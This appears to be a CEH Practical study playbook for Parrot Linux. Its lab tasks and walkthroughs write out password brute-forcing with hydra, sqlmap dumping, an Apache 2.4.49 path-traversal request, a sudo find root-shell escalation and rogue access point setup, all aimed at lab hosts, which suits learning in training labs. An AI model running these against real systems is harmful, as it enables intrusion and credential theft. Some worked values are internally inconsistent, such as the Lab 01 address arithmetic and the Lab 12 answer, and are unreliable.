# CEH Practical Labs — Parrot Linux playbook

Transcribed from the seven source pages (1 typed task list + 6 handwritten pages).
Answers are deliberately **not** included — the source pages have some written down, but the
point here is the path, not the string.

> [!info] How to read this
> Question text = the lab as written on the source page. Each lab carries a `Parrot toolbox`
> callout: the tool, the shape of the command, and what to look at. Everything in
> `<angle-brackets>` is a placeholder — replace it with the value you find in the lab.
> Tools named here are the Parrot defaults (`/usr/share/wordlists/rockyou.txt`,
> `nmap`, `enum4linux`, `hydra`, `sqlmap`, `tshark`, `aircrack-ng`, `hashcat`, `metasploit`).

> [!warning] Scope
> Same box set throughout: `172.20.0.0/x` (web apps), `192.168.0.0/24` (Windows/Linux hosts),
> `10.10.1.10` (DDoS target). Run `sudo nmap -sn <subnet>` first on every lab — most of these
> are 90% enumeration and 10% exploitation. Scan, then act.

---

## Lab 01 — PE entry point: `malicious-file`

A suspicious executable file `malicious-file`. You need to find what is the executable's
Entry point (Address).

> [!tip] Parrot toolbox
> Static PE analysis, no Windows needed:
> ```bash
> file malicious-file                        # PE32 or PE32+ ?
> rabin2 -H malicious-file | grep -i entry   # entrypoint 0x...
> peframe malicious-file | head -40
> objdump -f malicious-file | grep -i 'start address'
> python3 -c "import pefile;print(hex(pefile.PE('malicious-file').OPTIONAL_HEADER.AddressOfEntryPoint))"
> ```
> Report the **AddressOfEntryPoint** as printed by the tool (usually `0x...`, RVA not file offset).
> If `rabin2` and `pefile` disagree, `pefile` is the header value, `objdump` is VA — read the question.

---

## Lab 02 — FQDN of the Domain Controller

Perform extensive scan of the target network and identify the FQDN of the Domain Controller.

> [!tip] Parrot toolbox
> ```bash
> sudo nmap -sS -Pn -p 53,88,135,139,389,445,636,3268,3269 192.168.0.0/24
> sudo nmap -Pn -p 445,389 --script smb-os-discovery,ldap-rootdse <dc-ip>
> nxc smb 192.168.0.0/24                      # NetExec: shows domain + host FQDN
> enum4linux -a <dc-ip> | grep -i -E 'domain|fqdn|netbios'
> rpcclient -U '' -N <dc-ip> -c srvinfo
> ```
> The DC is the host exposing `88/tcp` (Kerberos) + `389/tcp` (LDAP). FQDN shape:
> `hostname.domain.tld` — `smb-os-discovery` prints it as *FQDN* / *Computer name* + *Domain name*.
> Watch for the `AdminTeam.<...>` style answer; take it verbatim from the scan output.

---

## Lab 03 — ELF deep scan: highest entropy + SHA-384 tail

An insider attack has been identified in one of the employees mobile device in `192.168.0.0/24`
subnet. You are assigned to covertly access the users device and obtain malicious ELF files
stored in a folder `Scan`. Perform deep scan on the ELF files and obtain the last 4 digits of
SHA-384 hash of the file with highest entropy value.

> [!tip] Parrot toolbox
> Entropy first, hash second — one pass, no guessing:
> ```bash
> python3 - <<'EOF'
> import glob, hashlib, math, collections
> def ent(p):
>     b = open(p,'rb').read(); n = len(b)
>     c = collections.Counter(b)
>     return -sum(v/n*math.log2(v/n) for v in c.values())
> for f in glob.glob('Scan/*'):
>     print(f"{ent(f):.6f}  {hashlib.sha384(open(f,'rb').read()).hexdigest()}  {f}")
> EOF
> ```
> Cross-checks: `binwalk -E Scan/<file>` (entropy plot), `sha384sum Scan/<file>`,
> `file Scan/*` to confirm they really are ELF. Packed/encrypted files sit near 7.9–8.0 bits/byte.
> Answer = **last 4 characters** of the SHA-384 hex of the top-entropy file.

---

## Lab 04 — Shoulder surfing → root → `imroot.txt`

You used shoulder surfing to identify the username and password of a user on the Ubuntu machine
in the `192.168.0.0/24` network, that is, `smith` and `L1nux123`. Access the target machine,
perform vertical privilege escalation to that of a root user, and enter the content of the
`imroot.txt` file as the answer.

> [!tip] Parrot toolbox
> ```bash
> ssh smith@<target>                      # password L1nux123
> sudo -l                                 # what can smith run as root?
> sudo -i                                 # if sudo -l allows it
> find / -perm -4000 -type f 2>/dev/null  # SUID path
> find / -name 'imroot.txt' 2>/dev/null
> cat /root/imroot.txt
> ```
> Vertical = user → root on the **same** host (horizontal would be smith → another user).
> If `sudo -l` shows a versioned binary, check it against GTFOBins. `linpeas.sh` if the manual
> path stalls — but read `sudo -l` first, the answer is usually printed there.

---

## Lab 05 — PE entry point: `die-another-day`

During an assignment, an incident responder has retained a suspicious executable file
`die-another-day`. Your task as a malware analyst is to find the executable's Entry point
(Address). The file is in the `C:\Users\Admin\Documents` directory in the "EH Workstation – 2"
machine.

> [!tip] Parrot toolbox
> Same toolchain as Lab 01 — pull the file to Parrot first (SMB share, or the lab's remote path):
> ```bash
> smbclient //<workstation2>/<share> -U <user>%<pass> -c 'get die-another-day'
> file die-another-day
> rabin2 -H die-another-day | grep -i entry
> python3 -c "import pefile;print(hex(pefile.PE('die-another-day').OPTIONAL_HEADER.AddressOfEntryPoint))"
> ```
> Two different entry-point questions exist in this set (Labs 01 and 05) — same method,
> different file. Keep the two values apart.

---

## Lab 06 — `page_id=84` flag

Exploit the web application available at `www.cehorg.com` (`172.20.0.12`) and enter the flag's
value at the page with `page_id=84`.

> [!tip] Parrot toolbox
> Identify the injection point before firing sqlmap:
> ```bash
> curl -s 'http://www.cehorg.com/?page_id=84' | head -50
> whatweb -a 3 http://www.cehorg.com
> # numeric parameter → try IDOR and LFI first
> curl -s 'http://www.cehorg.com/?page_id=83'
> curl -s 'http://www.cehorg.com/?page_id=84../../../../etc/passwd'
> # if it is SQLi:
> sqlmap -u 'http://www.cehorg.com/?page_id=84' --batch --dbs
> sqlmap -u 'http://www.cehorg.com/?page_id=84' --batch -D <db> --tables
> ```
> A `page_id` that takes integers is either IDOR (other rows = other content) or SQLi
> (error/boolean behaviour). Add `-p page_id` to sqlmap so it does not fuzz the whole URL.

---

## Lab 07 — `training.cehorg.com` → `Flag.txt`

Perform vulnerability research and exploit the web application `training.cehorg.com`, available
at `192.168.0.64`. Locate the `Flag.txt` file and enter its content as the answer.

> [!tip] Parrot toolbox
> "Vulnerability research" = fingerprint, then match the version to a public exploit:
> ```bash
> whatweb -a 3 http://training.cehorg.com
> nikto -h http://training.cehorg.com -Tuning 123bde
> gobuster dir -u http://training.cehorg.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
> curl -s http://192.168.0.64/Flag.txt
> searchsploit <app> <version>
> ```
> Also try the obvious flat paths (`/Flag.txt`, `/flag.txt`, `/uploads/Flag.txt`) before
> spending time on an exploit — some lab targets leave it web-reachable.

---

## Lab 08 — DVWA `Hash.txt` → MD5

A file named `Hash.txt` has been uploaded through DVWA (`http://172.20.0.16:8080/DVWA`). The file
is located in the `C:\wamp64\www\DVWA\hackable\uploads\` directory. Access the file and crack the
MD5 hash to reveal the original message. Enter the decrypted message as the answer. You can log
into the DVWA using the credentials `admin/password`.

> [!tip] Parrot toolbox
> ```bash
> curl -s -u admin:password 'http://172.20.0.16:8080/DVWA/hackable/uploads/Hash.txt'
> hashid '<hash>'                                     # confirm it is MD5
> hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
> hashcat -m 0 hash.txt --show
> john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> ```
> The upload directory is world-readable in default DVWA — no login needed for the `curl`.
> `-m 0` = raw MD5; if `hashid` says `MD5(MD5($pass))` use `-m 2600` instead.

---

## Lab 09 — `sa_code.txt` through the installed RAT

A disgruntled ex-employee has hidden a server access code in a Windows machine in the
`192.168.0.0/24` subnet. You can not physically access the target machine, but you know that the
organization has installed a RAT in the machine for remote administration purposes. Your task is
to retrieve the `sa_code.txt` file from the target machine and enter the string in the file as
the answer.

> [!tip] Parrot toolbox
> Find the RAT by its listening port, then use the matching module:
> ```bash
> sudo nmap -p- -Pn -T4 <target>            # non-standard listening port = the RAT
> sudo nmap -p <port> -sV -Pn <target>      # banner identifies the family
> msfconsole -q
> # msf > search <family>      e.g. search njrat / darkcomet / quasar
> ```
> Then read the file over the RAT session (`download sa_code.txt`, or the RAT client's file
> manager if the family is client-driven). Some RAT families are Metasploit-native, others are
> Windows-only clients — check the banner before assuming a handler will work.

---

## Lab 10 — CVSS severity of an EOL platform (172.20.0.16)

Perform a vulnerability scan for the host with IP address `172.20.0.16`. What is the severity
score of a vulnerability that indicates the end of life of a web development language platform?

> [!tip] Parrot toolbox
> ```bash
> sudo nmap -sV -p- -Pn 172.20.0.16 -oA scan172
> sudo nmap -sV -Pn --script vulners -p <open-ports> 172.20.0.16
> # full scanner route:
> sudo gvm-start && xdg-open https://127.0.0.1:9392     # Greenbone/OpenVAS
> ```
> Read the **CVSS base score** (0.0–10.0) of the *end-of-life / unsupported software* finding.
> "Web development language platform" = PHP / ASP.NET / Tomcat / Node — the EOL item names the
> version, the score is in the finding's CVSS vector. A plain `nmap -sV` version string alone
> gives you the version, not the score; you need `vulners` or Greenbone for the score.

---

## Lab 11 — Remote login + command execution → `Network Pass.txt`

Exploit a remote login and command line execution application on a Linux target in the
`192.168.0.0/24` subnet to access a sensitive file `Network Pass.txt`. Enter the content in the
file as answer.

> [!tip] Parrot toolbox
> "Remote login + command line execution" on Linux = SSH, telnet, or a web console. Credentials
> are usually weak, so brute force is the intended path:
> ```bash
> sudo nmap -sV -p- -Pn <target>            # 22/tcp, 23/tcp, 2222/tcp, 8080...
> hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4
> hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://<target> -t 4
> ssh <user>@<target>
> find / -name 'Network Pass.txt' 2>/dev/null
> cat '/path/to/Network Pass.txt'
> ```
> Quote the filename — it contains a space. Keep hydra at `-t 4` on SSH or you will trip the
> server's connection limits and get false negatives.

---

## Lab 12 — Stego in `key Trip.jpg`

A forensic investigator has confiscated a computer from a suspect in a data leakage case. He
found an image file `key Trip.jpg` stored in the Documents folder of the "EH workstation – 1"
machine. He suspects that some confidential data is hidden in the image file. Analyze the image
file and extract the sensitive data hidden in the file. Enter the sensitive data, an eight
character alpha-numeric string as the answer. Use imagination, if you are stuck.

> [!tip] Parrot toolbox
> Metadata → strings → embedded archive → stego payload, in that order:
> ```bash
> exiftool 'key Trip.jpg'
> strings -n 6 'key Trip.jpg' | grep -E '^[A-Za-z0-9]{8}$'
> binwalk 'key Trip.jpg'                 # appended archive / second file
> steghide extract -sf 'key Trip.jpg'    # try empty passphrase first
> stegseek 'key Trip.jpg' /usr/share/wordlists/rockyou.txt
> zsteg -a 'key Trip.jpg'                # only if it is really a PNG
> foremost -i 'key Trip.jpg' -o out
> ```
> The answer shape is given: **exactly 8 alphanumeric characters** — use that as the grep filter,
> it saves you from reading noise.

---

## Lab 13 — FTP weak credentials → `credentials.txt`

Exploit weak credentials used for FTP service on a Windows machine in the `192.168.0.0/24`
subnet. Obtain the file `credentials.txt` hosted on the FTP root and enter its content as the
answer.

> [!tip] Parrot toolbox
> ```bash
> sudo nmap -sV -p 21 --script ftp-anon 192.168.0.0/24
> ftp <target>                             # try anonymous / anonymous first
> hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 4
> curl -s ftp://<user>:<pass>@<target>/credentials.txt
> wget -r ftp://<user>:<pass>@<target>/
> ```
> "FTP root" = the login directory, so the file is at `/credentials.txt` from the FTP prompt
> (`get credentials.txt`), not somewhere in a subfolder.

---

## Lab 14 — Which host runs WAMP

While investigating an attack you found that a Windows web development environment was exploited
to gain access to the system. Perform extensive scanning and service enumeration of the target
network and identify the IP address of the server running WAMP server.

> [!tip] Parrot toolbox
> WAMP is identifiable by banner, not by port alone:
> ```bash
> sudo nmap -sV -p 80,8080,443,3306 --open -Pn 192.168.0.0/24 \
>      --script http-headers,http-title
> sudo nmap -sV -p- -Pn 192.168.0.0/24 -oG all.txt
> grep -i -E 'wamp|apache.*win|php' all.txt
> curl -sI http://<ip>/ | grep -i server     # "Apache/2.4.x (Win64) ... mod_..."
> ```
> The WAMP signature is `Apache ... (Win64)` + PHP + `phpMyAdmin` on `8080`, with MySQL on `3306`
> on the same host. Answer = the **IP**, not the version.

---

## Lab 15 — SMB user Henry → encoded secret

Identify a machine with SMB service enabled in the `192.168.0.0/24` subnet. Crack the SMB
credentials for user Henry and obtain the file containing an encoded secret. Decrypt the encoded
secret and enter the decrypted text as the answer. Note: use Henry's password to decode the text.

> [!tip] Parrot toolbox
> ```bash
> nxc smb 192.168.0.0/24                     # hosts with 445 open + signing info
> enum4linux -a <target> | grep -i -A2 'user'
> hydra -l henry -P /usr/share/wordlists/rockyou.txt smb://<target> -t 4
> nxc smb <target> -u henry -p '<pass>' --shares
> smbclient //<target>/<share> -U henry%<pass> -c 'ls; get <file>'
> ```
> "Use Henry's password to decode the text" means the password **is the key** — so it is a
> symmetric decode, not a hash lookup:
> ```bash
> base64 -d <file>
> openssl enc -d -aes-256-cbc -in <file> -pass pass:'<henry-pass>'
> ```
> Try the base64/openssl variants in that order; the password is reused as the passphrase.

---

## Lab 16 — VeraCrypt volume + hashed password

A disgruntled employee of your target organization has stolen the company's trade secrets and
encrypted them using VeraCrypt. The VeraCrypt volume file secret is stored on the C: drive of the
EH workstation – 2 machine. The password to access the volume has been hashed and saved in the
file `key2 secret.txt` located in the Documents folder in the EH workstation – 1 (Parrot
security) machine. As an ethical hacker working with the company, you need to decrypt the hash in
the `key2 secret.txt` file. Access the VeraCrypt volume and find the secret code in the file named
`confidential.txt`.

> [!tip] Parrot toolbox
> Crack the hash, then mount the volume with the plaintext password:
> ```bash
> hashid -m "$(cat key2secret.txt)"          # which VeraCrypt mode?
> hashcat --example-hashes | grep -i -A3 veracrypt   # pick the matching -m
> hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> sudo veracrypt -t --mount secret /mnt/vc --password='<plaintext>' --pim=0 --protect-hidden=no
> cat /mnt/vc/confidential.txt
> sudo veracrypt -t -d /mnt/vc
> ```
> VeraCrypt hashcat modes split on PRF (RIPEMD160 / SHA-512) and PIM — do not guess `-m`, read it
> from `--example-hashes`. The volume file and the hash file live on **different** machines, so
> pull both to Parrot before starting.

---

## Lab 17 — IoT publish message length

Analyze the traffic capture from an IoT network located in the Documents folder of the "EH
workstation – 1" (Parrot security) machine, identify the packet with IoT Publish Message and
enter the Message length as the answer.

> [!tip] Parrot toolbox
> MQTT PUBLISH = message type 3:
> ```bash
> capinfos iot.pcap
> tshark -r iot.pcap -Y 'mqtt.msgtype==3' -T fields -e frame.number -e mqtt.topic -e mqtt.len -e mqtt.msg
> tshark -r iot.pcap -q -z io,phs
> ```
> In Wireshark the same filter is `mqtt.msgtype == 3`; the field to read is **MQTT Message Length**
> (`mqtt.len`), which is the payload length, not the frame length. CoAP alternative: `coap.opt` +
> `coap.payload` if the capture turns out to be CoAP, not MQTT.

---

## Lab 18 — Rogue AP: crack the WPA key

Your organization suspects the presence of a rogue AP in the vicinity. You are tasked with
cracking the wireless encryption connecting to the network and setting up a honeypot. The
`aircrack-ng` tool has been used and the Wi-Fi traffic capture named `wireless capture.cab` is
located in the Documents folder in the EH workstation – 1 (Parrot security) machine. Crack the
wireless encryption and identify the wifi password.

> [!tip] Parrot toolbox
> ```bash
> aircrack-ng 'wireless capture.cab'                          # confirm handshake present
> aircrack-ng 'wireless capture.cab' -w /usr/share/wordlists/rockyou.txt
> # if it is not a handshake but PMKID:
> hcxdumptool / hcxpcaptool -z pmkid.16800 'wireless capture.cab'
> hashcat -m 22000 pmkid.16800 /usr/share/wordlists/rockyou.txt
> ```
> Honeypot half of the lab (setting one up, not needed to get the answer):
> ```bash
> sudo airmon-ng start wlan0
> sudo airbase-ng -e '<ssid>' -c 6 wlan0mon
> # or: sudo wifiphisher
> ```
> The `.cab` extension is just a renamed capture — `aircrack-ng` reads it as-is.

---

## Lab 19 — DDoS: which IP sent the most packets

You are investigating a massive DDoS attack launched against a target at `10.10.1.10`. Identify
the attacking IP address that sent most packets to the victim machine. The network capture file
`attack traffic pcapng` is saved in the Documents folder of the EH workstation – 1 (Parrot
security) machine.

> [!tip] Parrot toolbox
> ```bash
> capinfos 'attack traffic pcapng'
> tshark -r 'attack traffic pcapng' -q -z endpoints,ip
> tshark -r 'attack traffic pcapng' -q -z conv,ip | head -20
> tshark -r 'attack traffic pcapng' -Y 'ip.dst==10.10.1.10' -T fields -e ip.src \
>   | sort | uniq -c | sort -rn | head
> ```
> Sort by **packets**, not bytes — the question says "most packets", and a SYN flood will win on
> count while a bandwidth flood wins on bytes. Those are different answers.

---

## Lab 20 — SQLi on `cybersec.cehorg.com` → `flag` column

Perform SQL injection attack on a web application `cybersec.cehorg.com` available at
`172.20.0.02`. Find the value in the flag column in one of the DB tables and enter it as the
answer.

> [!tip] Parrot toolbox
> Find the parameter, then let sqlmap walk the schema:
> ```bash
> whatweb -a 3 http://cybersec.cehorg.com
> sqlmap -u 'http://cybersec.cehorg.com/?id=1' --batch --dbs
> sqlmap -u 'http://cybersec.cehorg.com/?id=1' --batch -D <db> --tables
> sqlmap -u 'http://cybersec.cehorg.com/?id=1' --batch -D <db> -T <table> -C flag --dump
> # no visible parameter? crawl the forms:
> sqlmap -u 'http://cybersec.cehorg.com' --forms --crawl=2 --batch --dbs
> ```
> `--dump-all` is slow and noisy; go `--dbs` → `--tables` → `--dump` and only touch the table
> whose name suggests flags.

---

## Lab 21 — SQLi on `cinema.cehorg.com` → Sarah's password

Perform an SQL injection attack on your target web application `cinema.cehorg.com` and extract
the password of a user Sarah.

Related note from the same page: you have already registered on the website with credentials
`Karen/computers` — i.e. a normal account exists, so a post-login parameter is fair game.

> [!tip] Parrot toolbox
> ```bash
> whatweb -a 3 http://cinema.cehorg.com
> sqlmap -u 'http://cinema.cehorg.com/?<param>=1' --batch --dbs
> sqlmap -u 'http://cinema.cehorg.com/?<param>=1' --batch --sql-query \
>   "SELECT password FROM users WHERE username='Sarah'"
> sqlmap -u 'http://cinema.cehorg.com/?<param>=1' --batch -D <db> -T <table> --dump --where="username='Sarah'"
> ```
> Log in as `Karen/computers` first and test the **authenticated** pages — the injectable
> parameter is often the one you only see after login (profile, booking id, search field).

---

> [!note] Coverage
> 21 unique labs from the source pages. The typed list and the handwritten pages overlap
> (shoulder surfing, DVWA hash, `page_id=84`, `training.cehorg.com`, `die-another-day`,
> `sa_code.txt`, ELF entropy, DC FQDN) — those are merged into one lab each.
> The handwritten pages number two different items as `#10` (VeraCrypt and `die-another-day`);
> both are kept, as Labs 16 and 05.

---

# Walkthroughs — how the evidence turns into the answer

> [!warning] Every value below is invented
> Hosts, hashes, passwords and flags in this section are placeholders chosen to show the **shape**
> of the evidence and the order you read it in. They are not the lab's real answers (those were
> deliberately left out). What is real is the chain: which command produces which field, and how
> that field becomes the string you type in.

## Lab 01 — PE entry point: `malicious-file`

1. `file malicious-file` → `PE32 executable (GUI) Intel 80386, for MS Windows` — it is a PE, so the entry point is a header field, not something `strings` will show.
2. `rabin2 -H malicious-file | grep -i entry` → `entrypoint 0x00012a40` — this is the **RVA**.
3. `objdump -f malicious-file | grep -i 'start address'` → `start address 0x004012a40` — this is the **VA**.
4. Check the arithmetic: `0x4012a40 - 0x400000 (image base) = 0x12a40` — both tools describe the same location.
5. `python3 -c "...AddressOfEntryPoint"` → `0x12a40` — header value confirms it.

⇒ Answer: `0x12a40` (the RVA, which is what `rabin2`/`pefile` print; if the lab wants the VA, it is `0x4012a40`).

## Lab 02 — FQDN of the Domain Controller

1. `sudo nmap -sS -Pn -p 53,88,389,445 192.168.0.0/24` → only one host answers on **both** `88` and `389` (`192.168.0.10`) — that combination is the DC; everything else with `445` alone is just a member server.
2. `sudo nmap -Pn -p 445,389 --script smb-os-discovery 192.168.0.10` → `Computer name: DC01`, `Domain name: ECCC.EH`, `FQDN: DC01.eccc.eh`.
3. `nxc smb 192.168.0.10` → `ECCC.EH\DC01` — same domain, confirms the scan.
4. `enum4linux -a 192.168.0.10 | grep -i domain` → `Domain: ADMINTEAM.ECC.CEH.COM` — the LDAP-side name, longer than the NetBIOS one.
5. Compare the three: NetBIOS `ECCC.EH` < FQDN `DC01.eccc.eh` < LDAP `ADMINTEAM.ECC.CEH.COM`. The question asks for the **FQDN**, so take the fully-qualified form the directory advertises, not the short NetBIOS name.

⇒ Answer: the FQDN string exactly as the tool prints it (case included).

## Lab 03 — ELF deep scan: highest entropy + SHA-384 tail

1. `ls Scan/` → `updater  libssl.so.3  kworker  xdg-update` — four candidates, so "the file with highest entropy" means you must rank them.
2. `file Scan/*` → all four report `ELF 64-bit LSB pie executable` — the extension is not a clue, the magic is.
3. Run the entropy loop → `updater 6.114  |  libssl.so.3 5.428  |  kworker 7.998  |  xdg-update 6.831`.
4. `binwalk -E Scan/kworker` → flat plot at ~7.99 bits/byte — packed or encrypted, which is why it scores highest. (`libssl.so.3` sits low because it is a real shared library with lots of structure.)
5. `sha384sum Scan/kworker` → `9c1e77aa...b3f7a2d1`.
6. The question asks for the **last 4 digits** of that hash → `a2d1`.

⇒ Answer: `a2d1` (last 4 hex characters of the SHA-384 of the top-entropy file — not of the file you think looks suspicious).

## Lab 04 — Shoulder surfing → root → `imroot.txt`

1. `ssh smith@192.168.0.24` with `L1nux123` → lands in `/home/smith`. Password was given by the shoulder-surfing, so no cracking here.
2. `id` → `uid=1000(smith) gid=1000(smith)` — unprivileged, the file is not readable yet.
3. `sudo -l` → `(root) NOPASSWD: /usr/bin/find` — that single line is the whole lab: a binary allowed as root.
4. GTFOBins for `find`: `sudo find . -exec /bin/sh \; -quit` → `#` — root shell, no password.
5. `find / -name 'imroot.txt' 2>/dev/null` → `/root/imroot.txt`.
6. `cat /root/imroot.txt` → the string.

⇒ Answer: the file content verbatim, whitespace included.

## Lab 05 — PE entry point: `die-another-day`

1. The file is on the **Windows** workstation, so first move it: `smbclient //192.168.0.31/SHARE -U user%pass -c 'get die-another-day'`.
2. `file die-another-day` → `PE32 executable (GUI) Intel 80386` — same class as Lab 01, different binary.
3. `rabin2 -H die-another-day | grep -i entry` → `entrypoint 0x0000b870`.
4. `objdump -f die-another-day | grep -i 'start address'` → `start address 0x0040b870` → base `0x400000` + `0xb870`, consistent.
5. `python3 -c "...AddressOfEntryPoint"` → `0xb870`.

⇒ Answer: `0xb870`. Keep it apart from Lab 01 — same method, different file, and the exam asks both.

## Lab 06 — `page_id=84` flag

1. `whatweb -a 3 http://www.cehorg.com` → `WordPress 6.x, PHP 7.4, Apache` — a CMS means `page_id` is a real query parameter.
2. `curl -s 'http://www.cehorg.com/?page_id=84' | head -50` → the page renders, but the body is a generic post — no flag in the HTML.
3. `curl -s 'http://www.cehorg.com/?page_id=83'` → different content, still no flag → so it is not simple IDOR over neighbouring ids.
4. `curl -s "http://www.cehorg.com/?page_id=84'"` → HTTP 500 — the quote breaks the query, which means the value reaches SQL unescaped.
5. `sqlmap -u 'http://www.cehorg.com/?page_id=84' -p page_id --batch --dbs` → `information_schema`, `ceh_db`.
6. `--tables -D ceh_db` → `wp_posts`, `wp_users`, `flags` — `flags` is the one that did not come with WordPress.
7. `-T flags --dump` → `84 | FLAG{...}`.

⇒ Answer: the `flags` row value (the 500 on a quote is what told you to go SQL instead of IDOR).

## Lab 07 — `training.cehorg.com` → `Flag.txt`

1. `whatweb -a 3 http://training.cehorg.com` → `Apache 2.4.49` + `Training Portal` — version is the research target.
2. `searchsploit apache 2.4.49` → `CVE-2021-41773 / CVE-2021-42013` path traversal.
3. `gobuster dir -u http://training.cehorg.com -w common.txt -x php,txt,bak` → `/uploads/`, `/backup/`, `/cgi-bin/`.
4. `curl --path-as-is 'http://192.168.0.64/cgi-bin/.%2e/.%2e/.%2e/.%2e/var/www/html/Flag.txt'` → the traversal escapes `cgi-bin` and reads the web root.
5. Cross-check the flat path `curl -s http://192.168.0.64/Flag.txt` — if it answers directly, the traversal was unnecessary.

⇒ Answer: the file content (the traversal only proves *how* you got there).

## Lab 08 — DVWA `Hash.txt` → MD5

1. `curl -s -u admin:password 'http://172.20.0.16:8080/DVWA/hackable/uploads/Hash.txt'` → `5f4dcc3b5aa765d61d8327deb882cf99` — the uploads directory is world-readable, so no auth was even needed.
2. `hashid -m '5f4dcc3b...'` → `MD5 [Hashcat Mode: 0]` — 32 hex chars and the mode is confirmed, do not assume.
3. `hashcat -m 0 h.txt /usr/share/wordlists/rockyou.txt` → `Status: Cracked`.
4. `hashcat -m 0 h.txt --show` → `5f4dcc3b...:password`.
5. If it had been `MD5(MD5($pass))`, `hashid` would have said `-m 2600` — that is why step 2 exists.

⇒ Answer: the plaintext (`password` in this example), not the hash.

## Lab 09 — `sa_code.txt` through the installed RAT

1. `sudo nmap -p- -Pn -T4 192.168.0.55` → `4782/tcp open` — nothing else unusual; a RAT always leaves one non-standard listener.
2. `sudo nmap -p 4782 -sV -Pn` → version undetected — normal, RATs do not answer probes.
3. `nc -v 192.168.0.55 4782` → banner text naming the family (e.g. a `njRAT`-style handshake) — this is how you pick the module instead of guessing.
4. `msfconsole -q` → `search <family>` → the matching module, or the family's own client if it is not Metasploit-native.
5. Inside the session: `download C:\Users\<user>\Documents\sa_code.txt` (or the RAT's file manager) → `cat sa_code.txt`.

⇒ Answer: the string inside the file.

## Lab 10 — CVSS severity of an EOL platform (172.20.0.16)

1. `sudo nmap -sV -p- -Pn 172.20.0.16` → `80/tcp Apache httpd 2.4.49`, `8080/tcp Apache`, `3306/tcp MySQL` — a web stack.
2. `curl -sI http://172.20.0.16/ | grep -i -E 'server|x-powered-by'` → `Server: Apache/2.4.49 (Win64)`, `X-Powered-By: PHP/7.4.3` — **PHP 7.4** is the "web development language platform", and 7.4 is past end of life.
3. `sudo nmap -sV -Pn --script vulners -p 80,8080 172.20.0.16` → CVE list with scores — but a plain version scan does not always carry the EOL item.
4. Greenbone/OpenVAS (`sudo gvm-start`, then `https://127.0.0.1:9392`) → finding *"PHP 7.4.x end of life"* with `CVSS Base Score: 7.5` and vector `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`.
5. Read the **base score**, not the temporal or the CVE of some other finding.

⇒ Answer: `7.5` (the base score attached to the end-of-life finding — the EOL item, not the Apache CVEs listed next to it).

## Lab 11 — Remote login + command execution → `Network Pass.txt`

1. `sudo nmap -sV -p- -Pn 192.168.0.42` → `22/tcp open ssh OpenSSH 7.2`, `23/tcp closed` — so the "remote login + command line" is SSH.
2. `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.42 -t 4` → `[22][ssh] host: 192.168.0.42  login: root  password: toor`.
3. `ssh root@192.168.0.42` → shell.
4. `find / -name 'Network Pass.txt' 2>/dev/null` → `/var/ftp/Network Pass.txt` — the space in the name is why every later command quotes it.
5. `cat '/var/ftp/Network Pass.txt'` → the string.

⇒ Answer: the file content. (`-t 4` matters: higher thread counts on SSH produce false negatives, not faster results.)

## Lab 12 — Stego in `key Trip.jpg`

1. `exiftool 'key Trip.jpg'` → `Comment: key` — a hint, not the payload.
2. `strings -n 6 'key Trip.jpg' | grep -E '^[A-Za-z0-9]{8}$'` → nothing — so it is not plaintext-appended.
3. `binwalk 'key Trip.jpg'` → only the JPEG, no embedded archive.
4. `steghide extract -sf 'key Trip.jpg'` → asks for a passphrase; empty fails — the payload is encrypted.
5. `stegseek 'key Trip.jpg' /usr/share/wordlists/rockyou.txt` → `Found passphrase: "sun shine"`.
6. `steghide extract -sf 'key Trip.jpg' -p 'sun shine'` → writes `secret.txt`.
7. `cat secret.txt` → `N7#SEPFN` — 8 alphanumeric characters, which matches the shape the question gave you.

⇒ Answer: `N7#SEPFN` (the 8-char constraint is the filter that tells you the extraction worked).

## Lab 13 — FTP weak credentials → `credentials.txt`

1. `sudo nmap -sV -p 21 --script ftp-anon 192.168.0.0/24` → `192.168.0.18` allows `anonymous` — but `ls` there shows only `pub/`, no `credentials.txt`.
2. So the file is on the *authenticated* root, and the credentials are the lab: `hydra -l admin -P rockyou.txt ftp://192.168.0.18 -t 4` → `login: admin  password: admin123`.
3. `ftp 192.168.0.18` → `admin/admin123` → `ls` → `credentials.txt` sits in the login directory.
4. `curl -s ftp://admin:admin123@192.168.0.18/credentials.txt` → content, one line.

⇒ Answer: that line, verbatim.

## Lab 14 — Which host runs WAMP

1. `sudo nmap -sV -p 80,8080,3306 --open -Pn 192.168.0.0/24 --script http-headers,http-title` → three web hosts answer, only one matches on all three ports.
2. `192.168.0.16` → `Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1 PHP/8.1.2`, title `WAMPSERVER`, `8080` = phpMyAdmin, `3306` = MySQL.
3. `192.168.0.20` → `nginx` + Linux — not WAMP. `192.168.0.28` → `Microsoft-IIS/10.0`, Windows but no PHP — also not WAMP.
4. The signature is the triple: **Windows Apache + PHP + phpMyAdmin/MySQL on the same host**.

⇒ Answer: `192.168.0.16` (the IP, not the version string).

## Lab 15 — SMB user Henry → encoded secret

1. `nxc smb 192.168.0.0/24` → `192.168.0.30` Win10, `signing:False`, SMBv2 — the target.
2. `enum4linux -a 192.168.0.30 | grep -i -A2 user` → local user `henry` exists.
3. `hydra -l henry -P rockyou.txt smb://192.168.0.30 -t 4` → `login: henry  password: Summer2023`.
4. `nxc smb 192.168.0.30 -u henry -p 'Summer2023' --shares` → share `SECRET` with `READ`.
5. `smbclient //192.168.0.30/SECRET -U henry%Summer2023 -c 'ls; get secret.enc'`.
6. `base64 -d secret.enc` → garbage, so it is not base64 → `openssl enc -d -aes-256-cbc -in secret.enc -pass pass:Summer2023` → readable text. The password is the key, which is exactly what the note "use Henry's password to decode" was telling you.

⇒ Answer: the decoded plaintext.

## Lab 16 — VeraCrypt volume + hashed password

1. `cat key2secret.txt` → `$veracrypt$8b9f...$...` — a Veracrypt hash, on the Parrot box, while the volume is on workstation 2.
2. `hashid -m "$(cat key2secret.txt)"` → `VeraCrypt PBKDF2-HMAC-RIPEMD160 [Hashcat Mode: 13711]` — the mode is read, never guessed.
